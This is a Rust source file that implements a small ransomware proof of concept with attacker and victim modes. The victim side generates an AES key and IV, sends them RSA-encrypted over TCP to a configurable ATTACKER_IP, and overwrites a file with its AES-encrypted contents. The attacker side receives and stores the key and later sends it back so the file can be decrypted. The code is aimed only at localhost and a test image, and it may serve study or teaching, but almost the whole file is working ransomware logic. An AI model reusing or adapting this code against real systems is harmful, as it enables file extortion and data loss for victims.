use std::{
    fs,
    io::{
        Read,
        Write
    },
    net::{
        TcpStream,
        TcpListener
    },
    str::FromStr
};

use clap::Parser;
use crypto::{
    aes::{
        self,
        KeySize,
    },
    blockmodes,
    buffer::{BufferResult,
             ReadBuffer,
             WriteBuffer
    },
};
use rand;
use rsa::{
    Pkcs1v15Encrypt,
    RsaPrivateKey,
    RsaPublicKey,
    pkcs8::{
        DecodePublicKey,
        EncodePublicKey
    },
};

// const PRV_PATH: &str = &"received.txt";
// file used for testing
const FILE_PATH: &str = &"testing.png";
// IP the victim sends the encrypted encryption key to
const ATTACKER_IP: &str = &"127.0.0.1";
// port the victim sends the encrypted encryption key to
const ATTACKER_PORT: &str = &"12345";
// IP the attacker sends the encryption key to
const VICTIM_IP: &str = &"127.0.0.1";
// port the victim listens to to receive the encryption key
const VICTIM_PORT: &str = &"12345";
// local file where the attacker stores the AES key (plaintext)
const AES_KEY_PATH: &str = "aes_key.txt";
// local file where the attacker stores the AES IV (plaintext)
const AES_IV_PATH: &str = "aes_iv.txt";

#[derive(PartialEq, Debug)]
enum EndType {
    AttackerStart,  // listen for a key and store it
    VictimStart,    // encrypt a file and send the key to server
    AttackerEnd,    // send back the key
    VictimEnd,      // decrypt file with received key
}

impl FromStr for EndType {
    type Err = ();

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "as" => Ok(EndType::AttackerStart),
            "vs" => Ok(EndType::VictimStart),
            "ae" => Ok(EndType::AttackerEnd),
            "ve" => Ok(EndType::VictimEnd),
            _ => Err(())
        }
    }
}

#[derive(Parser, Debug)]
#[command(version, about = "`Cargo run -- as`: Attacker Start. Listens for connection from victim.\n`Cargo run -- vs`: Victim Start. Encrypts a file and sends encrypted key to victim.\n`Cargo run -- ae`: Attacker End. Send AES key to victim in plaintext.\n`Cargo run -- ve`: Victim End. Receives AES key and decrypts file.")]
struct Args {
    server_or_client: String,
}

// victim: send to attacker RSA-encrypted AES-key and AES-IV, then AES-encrypt a file
fn client() {
    // try to connect to attacker
    if let Ok(mut stream) = TcpStream::connect(format!("{ATTACKER_IP}:{ATTACKER_PORT}")) {
        println!("[+] Connection established. {:?} -> {:?}", stream.local_addr().unwrap(), stream.peer_addr().unwrap());

        // generate aes key
        let mut rng = rand::thread_rng();
        // initialization vector
        let iv = rand::seq::index::sample(&mut rng, u8::MAX as usize, 16)
            .iter()
            .map(|n| n.try_into().unwrap())
            .collect::<Vec<u8>>();
        // main key
        let key = rand::seq::index::sample(&mut rng, u8::MAX as usize, 32)
            .iter()
            .map(|n| n.try_into().unwrap())
            .collect::<Vec<u8>>();

        println!("[+] Created IV, KEY for AES.");

        // get the public key to encrypt the aes key asymmetrically
        let mut pubkey = Vec::<u8>::from([0; 294]);
        stream.read(&mut pubkey).expect("[-] Couldn't read public key");
        let pubkey = RsaPublicKey::from_public_key_der(&pubkey).expect("[-] Public key not in the right format.");
        println!("[+] Received public key.");

        // encrypt the aes key using rsa
        let mut rng = rand::thread_rng();
        let enc_key = pubkey.encrypt(&mut rng, Pkcs1v15Encrypt, &key).expect("[-] Could not encrypt aes key");
        println!("[+] Encrypted AES key");
        // do the same with the IV
        let enc_iv = pubkey.encrypt(&mut rng, Pkcs1v15Encrypt, &iv).expect("[-] Could not encrypt IV.");
        println!("[+] Encrypted IV");

        // now send both of them back to the attacker
        stream.write(&enc_key).expect("[-] Could not send encrypted key over stream.");
        println!("[+] Sent AES encrypted key to attacker.");
        stream.write(&enc_iv).expect("[-] Could not send encrypted IV over stream.");
        println!("[+] Sent AES encrypted IV to attacker.");

        // symmetrically encrypt (aes) a file
        aes_encrypt(&iv, &key, FILE_PATH);
        println!("[+] File encrypted.");
    } else {
        println!("[-] Couldn't connect to server");
        std::process::exit(1);
    }
}

// server sends public key to victim
// then receives the aes key encrypted with rsa
fn server() {
    // listen on all interfaces (the victim listens to the same port as the attacker)
    if let Ok(listener) = TcpListener::bind(format!("0.0.0.0:{ATTACKER_PORT}")) {
        // after a connection is established
        if let Some(stream) = listener.incoming().next() {
            match stream {
                Ok(mut s) => {
                    println!("[+] Found incoming connections.");

                    // generate a private-public key pair
                    let mut rng = rand::thread_rng();
                    let bit_size = 2048;
                    let private_key = RsaPrivateKey::new(&mut rng, bit_size).expect("[-] Error creating private key.");
                    println!("[+] Generated private key.");
                    let public_key = RsaPublicKey::from(private_key.clone());
                    println!("[+] Created public key from private key.");

                    // and send the public key to the connected client
                    s.write(&public_key
                        .to_public_key_der()
                        .unwrap()
                        .as_bytes())
                        .expect("[-] Could not send the public key to the victim.");
                    println!("[+] Public key sent to victim.");

                    // read AES encrypted key
                    let mut enc_key = Vec::<u8>::from([0; 256]);
                    s.read(&mut enc_key).expect("[-] Could not read encrypted AES key.");
                    println!("[+] Received RSA-encrypted AES key.");
                    // decrypt it
                    let key = private_key.decrypt(Pkcs1v15Encrypt, &enc_key).expect("[-] Could not decrypt received AES key.");
                    println!("[+] Decrypted AES key using private key.");
                    // and save it to a file
                    fs::write("aes_key.txt", &key).expect("[-] Could not write AES key to file.");
                    println!("[+] AES key saved in file `aes_key.txt`.");

                    // now do the same with the encrypted IV
                    let mut enc_iv = Vec::<u8>::from([0; 256]);
                    s.read(&mut enc_iv).expect("[-] Could not read encrypted AES IV.");
                    println!("[+] Received RSA-encrypted AES IV.");
                    // decrypt it
                    let iv = private_key.decrypt(Pkcs1v15Encrypt, &enc_iv).expect("[-] Could not decrypt received AES IV.");
                    println!("[+] Decrypted AES IV using private key.");
                    // and save it to a file
                    fs::write("aes_iv.txt", &iv).expect("[-] Could not write AES IV to file.");
                    println!("[+] AES IV saved in file `aes_iv.txt`.")
                },
                Err(e) => {
                    println!("[-] Error: {e:?}");
                    std::process::exit(1);
                },
            }
        }
    }
}

fn send_key_back() {
    // connect to victim's pc (they listen to the same port as the attacker)
    if let Ok(mut stream) = TcpStream::connect(format!("{VICTIM_IP}:{ATTACKER_PORT}")) {
        // open the file containing the AES key and send its contents
        println!("[*] Sending AES key...");
        stream.write(
            &fs::read(AES_KEY_PATH)
                .unwrap()
        ).expect("[-] Could not send AES key");
        println!("[+] AES key sent.");

        // do the same for the AES IV
        println!("[*] Sending AES IV...");
        stream.write(
            &fs::read(AES_IV_PATH)
                .unwrap()
        ).expect("[-] Could not send AES IV");
        println!("[+] AES IV sent.");
    }
}

fn aes_encrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
    // the result of the encryption
    let mut encrypted = Vec::<u8>::new();

    if let Ok(data) = fs::read(path_to_file.clone()) {
        // buffers used to perform encryption
        let mut rbuffer = crypto::buffer::RefReadBuffer::new(&data);
        let mut tbuffer = [0; 4096];
        let mut wbuffer = crypto::buffer::RefWriteBuffer::new(&mut tbuffer);

        // what actually performs the encryption
        let mut encryptor = aes::cbc_encryptor(KeySize::KeySize256, &key, &iv, blockmodes::PkcsPadding);

        println!("[*] Encrypting...");
        // block-encrypt...
        loop {
            let finished = encryptor.encrypt(&mut rbuffer, &mut wbuffer, true).expect("[-] Could not encrypt file.");
            encrypted.extend(wbuffer.take_read_buffer().take_remaining().iter());

            // .. for as long as there are blocks
            match finished {
                BufferResult::BufferUnderflow => {
                    break;
                }
                BufferResult::BufferOverflow => {},
            }
        }
        println!("[+] Encryption complete.");
    }

    // finally, overwrite the file
    fs::write(path_to_file, &encrypted).expect("[-] Error on write.");
}

fn aes_decrypt(iv: &[u8], key: &[u8], path_to_file: &str) {
    let mut decrypted: Vec<u8> = Vec::new();

    if let Ok(data) = fs::read(path_to_file.clone()) {
        // buffers used to perform encryption
        let mut rbuffer = crypto::buffer::RefReadBuffer::new(&data);
        let mut tbuffer = [0; 4096];
        let mut wbuffer = crypto::buffer::RefWriteBuffer::new(&mut tbuffer);

        // what actually performs the decryption
        let mut decryptor = aes::cbc_decryptor(KeySize::KeySize256, &key, &iv, blockmodes::PkcsPadding);

        // block-decrypt...
        println!("[*] Starting decryption...");
        loop {
            let finished = decryptor.decrypt(&mut rbuffer, &mut wbuffer, true).expect("[-] Could not decrypt file.");
            decrypted.extend(wbuffer.take_read_buffer().take_remaining().iter());

            // .. for as long as there are blocks
            match finished {
                BufferResult::BufferUnderflow => {
                    break;
                }
                BufferResult::BufferOverflow => {},
            }
        }
    }

    // finally, overwrite the file
    fs::write(path_to_file, &decrypted).expect("[-] Error on write.");
    println!("[+] File decrypted.");
}

fn read_and_decrypt() {
    let mut aes_key = Vec::from([0; 32]);
    let mut aes_iv = Vec::from([0; 16]);

    // listen on all interfaces for the attacker's connection
    if let Ok(listener) = TcpListener::bind(format!("0.0.0.0:{VICTIM_PORT}")) {
        println!("[+] Connected to the attacker.");
        println!("[*] Waiting for AES key...");

        // after the attacker connects to the victim
        if let Some(Ok(mut stream)) = listener.incoming().next() {
            // they send them the AES key and IV in plaintext
            stream.read(&mut aes_key).expect("[-] Could not read AES key from stream.");
            println!("[+] Received AES key.");
            println!("[*] Waiting for AES IV...");

            stream.read(&mut aes_iv).expect("[-] Could not read AES IV from stream.");
            println!("[+] Received AES IV.");
        }
    }

    // now use what the attacker sent to perform decryption
    println!("[*] Starting decryption...");
    aes_decrypt(&aes_iv, &aes_key, "testing.png");
    println!("[+] Decryption completed.");
}

fn main() {
    let args = Args::parse();

    match EndType::from_str(&args.server_or_client) {
        Ok(EndType::VictimStart) => client(),
        Ok(EndType::AttackerStart) => server(),
        Ok(EndType::VictimEnd) => read_and_decrypt(),
        Ok(EndType::AttackerEnd) => send_key_back(),
        Err(()) => {
            eprintln!("Error.");
            std::process::exit(1);
        },
    }
}